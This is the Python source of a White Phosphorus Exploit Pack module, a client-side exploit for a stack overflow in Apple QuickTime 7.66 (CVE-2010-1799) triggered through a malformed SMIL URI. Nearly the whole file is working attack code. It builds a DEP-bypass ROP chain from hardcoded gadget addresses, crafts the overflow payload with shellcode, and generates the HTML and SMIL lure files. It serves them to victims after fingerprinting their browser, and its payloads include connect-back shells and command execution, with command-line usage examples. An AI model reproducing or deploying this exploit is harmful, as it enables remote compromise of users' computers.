
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator


######################################################################################
NAME = "Apple Quicktime v7.66 Invalid SMIL URI Debug Overflow"
DESCRIPTION = "Exploits a stack-based overflow in Apple Quicktime v7.66 triggered with an invalid SMIL uri"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Apple'
DOCUMENTATION["Date public"] = "2010-07-26"
DOCUMENTATION["References"] = "http://www.secunia.com/advisories/40729"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "CVE-2010-1799"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1799'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION['VersionsAffected']='7.66'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via clientd or httpserver.

If you host this exploit file independantly, then you must host the .smil file as well.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "2003"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
This is a client-side exploit - so use it via clientd or httpserver.
If you host this exploit file independantly, then you must host the .smil file as well.

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Apple Quicktime Invalid SMIL URI Debug Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows XP Universal

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_quicktime_smil/wp_quicktime_smil.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows 2k3,XP DEP Bypass (7.66)", (0x00000000), [WINXP]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    # Clienside exploits default to HTTPMosdef PLAIN for clientD
    DEFAULT_PAYLOAD = 2

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        # We default these to false        
        self.HTTPMOSDEF   = False
        self.useSSLMOSDEF = False
        self.isClientD    = False
        
                
        self.badstring = "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40\x5c"
        
        #Ranomisze name for clientd
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html" 
                
        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
       
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, if recon modules are enabled
        # returns a value used to rank the exploit within attacking modules
        """
        Check for IE 6
        """
        self.isClientD = True
        if "MSIE" in info_dict['user_agent']:
            self.log("WP> Target has MSIE")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] # it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:
            # Potentially called from httpserver update shellcode accordingly        
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2
            
        # Selected shell options
        self.wp_getShellcodeType()
        
        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface
            
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def wp_DEPBypassQuickTimeSmil(self):
                
        self.log("WP> Building Universal DEP bypass")
        
        depBypass = pack('<L', 0x66834755)  # PUSH ESP / POP ESI / RET
        depBypass += pack('<L', 0x6692597A) # MOV EAX, ESI / RET
        depBypass += pack('<L', 0x670C5943) # ADD EAX, 3C / RET
        depBypass += pack('<L', 0x670C5849) # add EAX, 18 / RET
        depBypass += pack('<L', 0x668E466D)*3 # add eax, 8
        depBypass += pack('<L', 0x66A6C94C) # XCHG EAX, EDI / RET
        depBypass += pack('<L', 0x66834755) # PUSH ESP / POP ESI / RET
        depBypass += pack('<L', 0x6692597A) # MOV EAX, ESI / RET
        depBypass += pack('<L', 0x66A99F74) # STOSD
        depBypass += pack('<L', 0x66818579) # XOR EAX, EAX
        depBypass += pack('<L', 0x66AEC813) # ADD EAX, 800 / POP ESI / RET
        depBypass += pack('<L', 0x61616161)
        depBypass += pack('<L', 0x66A99F74) # STOSD
        depBypass += pack('<L', 0x66AEC813) # ADD EAX, 800 / POP ESI / RET
        depBypass += pack('<L', 0x61616161)
        depBypass += pack('<L', 0x66A99F74) # STOSD
        depBypass += pack('<L', 0x66818579) # XOR EAX, EAX
        depBypass += pack('<L', 0x668F9B80) # ADD EAX, 40 / POP EBP / RET
        depBypass += pack('<L', 0x61616161) #
        depBypass += pack('<L', 0x66A99F74) # STOSD
        depBypass += pack('<L', 0x66A6C94C) # XCHG EAX, EDI / RET
        depBypass += pack('<L', 0x6685E4A4) # XCHG EAX, EBP / RET    
        depBypass += pack('<L', 0x66802173) # POP ECX / RET
        depBypass += pack('<L', 0x671BD278) # VirtualAlloc
        depBypass += pack('<L', 0x66834F87) # MOV EAX, [ECX] / RET
        depBypass += pack('<L', 0x668EA7E5) # CALL EAX / RET        
        depBypass += pack('<L', 0x61616161)*4 # write params here
        depBypass += pack('<L', 0x66855634) # PUSH ESP / RETN
        depBypass += wp_randomnops(4)
        
        self.depBypass_size = len(depBypass) 
        self.log("WP> Universal DEP Bypass Size: %d Bytes" % self.depBypass_size)
        return depBypass
    
    def makesmil(self):
        
        payload = wp_randomstring(5)
        payload += "://"
        
        payload += "A"*(617)
        payload += pack('<L', 0x66808257) # ADD ESP, 20
        payload += "BBBB"
        payload += pack('<L', 0x66812811) # ADD ESP, 1C
        payload += "BBBB"
        payload += "BBBB"
        payload += "BBBB"
        payload += "BBBB"
        payload += "BBBB"
        payload += pack('<L', 0x66884435) # ADD ESP, 980
        payload += self.wp_DEPBypassQuickTimeSmil()
        payload += self.shellcode
        payload += "B"*90000

        filedata = """
<smil xmlns="http://www.w3.org/2001/SMIL20/Language">
<body>
<img src="PAYLOAD" />
</body>
</smil>
""".replace('PAYLOAD', payload)
        
        self.log("WP> Opening %s"%(self.filename.replace('.html','.smil')))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        
        return filedata

    def makefile(self):

        filedata = """
<html>
<body>
<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" codebase="http://www.apple.com/qtactivex/qtplugin.cab">
    <param name="SRC" value = "SMILFILE">
    <param name="QTsrc" value = "SMILFILE">
    <param name="AUTOPLAY" value = "true">
    <param name="TYPE" value = "video/quicktime">
    <param name="TARGET" value = "myself">
    <embed 
        SR = "QTLFILE" QTsrc = "QTLFILE" TARGET = "myself" WIDTH = "1" HEIGHT = "1" AUTOPLAY = "true" 
        PLUGIN = "quicktimeplugin" TYPE = "video/quicktime" CACHE = "false" PLUGINSPAGE= "http://www.apple.com/quicktime/download/" >
    </embed>
</object>
</body>
</html>
"""
        filedata = filedata.replace('SMILFILE', (self.filename.replace('.html', '.smil')))
        filedata = filedata.replace('QTLFILE', (self.filename.replace('.html', '.qtl')))
        return filedata

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()
        
        # The main call from ClientD
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        
        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')        
        
        #self.log('WP> User agent of connecting host: %s' % user_agent)         
        
        if clientheader.URL.count(self.filename):
            self.log('WP> Serving exploit file')

            data=self.makefile()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        elif (clientheader.URL.count('.smil') or clientheader.URL.count('.qtl')):            
            self.log('WP> Serving .smil file')

            data=self.makesmil()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','application/smil')
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b

    def run(self):
        
        filedata=self.makefile()
        self.log("WP> Opening %s"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote exploit .html file')
        
        # makesmil, creates the file itself.
        filedata=self.makesmil()
        self.log('WP> Wrote exploit .smil file')
        
        self.log('WP> Output complete')
        
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
